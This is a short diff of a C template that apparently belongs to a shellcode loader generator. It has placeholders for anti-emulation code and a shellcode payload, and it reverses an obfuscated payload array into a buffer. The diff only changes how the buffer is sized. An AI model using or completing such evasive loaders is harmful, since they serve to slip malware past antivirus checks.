@@ -7,9 +7,9 @@
 int main(void) {
 	{{ANTI_EMULATION}}
 
-	char shellcode[562] = { 0 };
-
 	{{SHELLCODE}}
+
+	char shellcode[sizeof(reversed_payload)] = { 0 };
 
 	// reverse our array of ints
 	for (int i = 0; i < sizeof(reversed_payload); i++)
